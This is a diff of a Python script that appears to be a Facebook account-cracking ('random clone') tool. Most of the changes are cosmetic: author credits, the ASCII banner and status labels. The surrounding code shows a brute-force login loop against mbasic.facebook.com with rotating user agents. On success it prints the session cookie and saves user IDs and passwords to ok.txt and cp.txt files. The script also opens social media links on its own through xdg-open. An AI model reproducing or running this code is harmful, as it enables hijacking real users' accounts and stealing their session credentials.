@@ -1,7 +1,3 @@
-#Create By: Hackercodeß
-#FaceBook: Kali Linux
-#GitHub: https://github.com/MohammedFarouq/cloning-.git
-#----------------------------------------------------------------------------#
 import os,sys,time,json,random,re,string,platform,base64,uuid
 from bs4 import BeautifulSoup as sop
 from bs4 import BeautifulSoup
@@ -74,19 +70,19 @@ for xd in range(10000):
     ugen.append(uaku2)
 os.system('xdg-open https://github.com/MohammedFarouq/cloning-.git')
 logo = ("""
-\033[1;91m    _____   ___   ______  ___________   ________
-\033[1;92m   /  _/ | / / | / / __ \/ ____/  | / /__/
-\033[1;93m   / //  |/ /  |/ / / / /_ /  | / /
-\033[1;94m _/ // /|  / /|  / /_/ /___/ /_/ /|  / / /    
-\033[1;95m/___/_/ |/ |_/\____/\____/____/ |_/_/     \033[1;92m
+\033[1;91m    |      /          /\              |                    |
+\033[1;92m    |    /          /    \            |                    |
+\033[1;93m    |  /          /--------\          |                    |
+\033[1;94m    |  \        /            \        |                    |
+\033[1;95m    |    \    /                \      |_______        |                 \033[1;92m
  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
- ┃ [✓] AUTHOR    \033[1;91m: \033[1;92mMohammed Farouq           ┃
+ ┃ [✓] AUTHOR    \033[1;91m: \033[1;92mHACKCODEß           ┃
  ┃ [✓] TOOL      \033[1;91m: \033[1;92mRANDOM CLONE               ┃
- ┃ [✓] STATUS    \033[1;91m: \033[1;92mFREE Tool                       ┃
+ ┃ [✓] STATUS    \033[1;91m: \033[1;92mFREE                       ┃
  ┃ [✓] SYSTEM    \033[1;91m: \033[1;92mDATA & WIFI                ┃
- ┃ [✓] GITHUB    \033[1;91m: \033[1;92mHackercodeß          ┃
- ┃ [✓] FACEBOOK  \033[1;91m: \033[1;92mKali Linux               ┃
- ┃ [✓] WHATSAPP  \033[1;91m: \033[1;92m+2348120395847           ┃
+ ┃ [✓] GITHUB    \033[1;91m: \033[1;92mhttps://github.com/MohammedFarouq.git   ┃
+ ┃ [✓] FACEBOOK  \033[1;91m: \033[1;92mKali Linux     ┃
+ ┃ [✓] WHATSAPP  \033[1;91m: \033[1;92m+2348120395847        ┃
  ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
 
 class Main:
@@ -102,7 +98,7 @@ class Main:
         print(" [00] Exit")
         print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
         Mumit =input(" [?] Choose : ")
-        os.system('xdg-open https://www.facebook.com/profile.php?id=100000280956680/')
+        os.system('xdg-open https://www.facebook.com/profile.php?id=100000280956680 /')
         if Mumit in ["1", "01"]:
             num()
         if Mumit in ["2","02"]:
@@ -156,7 +152,7 @@ def gml():
     print(logo)
     print(' [+] EXAMPLE : @gmail.com, @yahoo.com ')
     print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-    doamin = input(' [?] Terget doamin : ')
+    doamin = input(' [?] Target doamin : ')
     os.system('clear')
     print(logo)
     print(' [+] EXAMPLE : 3000, 5000, 10000, 50000 ')
@@ -189,7 +185,7 @@ def rcrack1(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            sys.stdout.write('\r[\033[1;92mLOADING\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
+            sys.stdout.write('\r[\033[1;92mINNOCENT\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
             sys.stdout.flush()
             free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
@@ -225,7 +221,7 @@ def rcrack1(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print(f"\033[38;5;46m[ENJOY-OK] {uid} | {ps}")
+                print(f"\033[38;5;46m[Bomb-OK] {uid} | {ps}")
                 print(f" Cookie : {coki}")
                 open('/sdcard/ok.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(uid)
@@ -233,14 +229,14 @@ def rcrack1(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[82:97]
-                print(f"\x1b[38;5;196m[RUBBISH-CP] {cid}|{ps}")
+                print(f"\x1b[38;5;196m[Bomb-CP] {cid}|{ps}")
                 open('/sdcard/cp.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\033[m[LOADING] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
+        sys.stdout.write(f'\r\033[m[Bomb] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass
